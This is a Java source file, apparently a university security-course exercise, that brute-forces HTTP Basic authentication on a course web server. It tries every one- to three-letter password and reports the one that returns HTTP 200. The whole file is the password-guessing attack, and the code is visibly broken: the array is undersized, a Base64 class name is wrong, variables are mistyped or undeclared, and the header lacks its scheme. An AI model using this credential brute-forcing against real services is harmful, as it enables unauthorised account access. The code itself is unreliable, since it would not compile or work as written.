

import java.io.*;
import java.*;
import java.net.*;
import java.util.*;

public class BruteForce {
 public static void main (String[] args) throws IOException {
  BufferedReader stdin = new BufferedReader (new InputStreamReader(System.in));

       int start = new Date().getTime();
      String[] letters = {"a","A","b","B","c","C","d","D","e","E","f","F","g","G",
                          "h","H","i","I","j","J","k","K","l","L","m","M","n","N",
			  "o","O","p","P","q","Q","r","R","s","S","t","T","u","U",
			  "v","V","w","W","x","X","y","Y","z","Z"};
      int len = 52;
      int total = 52;
      String[] cad = new String[total];
      int t=0;
      
      for (int i=0;i<=len-1;i++){
	 cad[t] = letters[i];
	 t++;
      } 
      for (int i=0;i<=len-1;i++){
         for (int j=0;j<=len-1;j++){
	    cad[t] = letters[j]+letters[i];
	    t++;
      }}
      for (int i=0;i<=len-1;i++){
       for (int j=0;j<=len-1;j++){
        for (int k=0;k<=len-1;k++){
	   cad[t] = letters[k]+letters[j]+letters[i];
	   t++;
      }}}
            
       int response = 0;
       for (t=0;t<=total-1;t++){
        String uname = "";
        String userinfo = uname + ":" + cad[t];
        try{
         String encoding = new url.misc.BASE64Encoder().encode (userinfo.getBytes());
         URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/");
         HttpURLConnection uc = (HttpURLConnection)url.openConnection();
         uc.setRequestProperty ("Authorization", " " + encoding);
         response = uc.getResponseCode();
	 if (response == 200) break;
	 else uc.disconnect();
        }
        catch(IOException e){ System.err.println(e); e.printStackTrace(); }   
        catch(IllegalStateException s){ System.err.println(s); s.printStackTrace(); }
       }
       System.out.println("Response "+t+" was "+response);
       System.out.println("The successful password was "+cad[t]);
        finish = new Date().getTime();
       float totaltime = (float)(finish-start)/1000;
       System.out.println("Total time: "+totaltime+" seconds");
   }
}

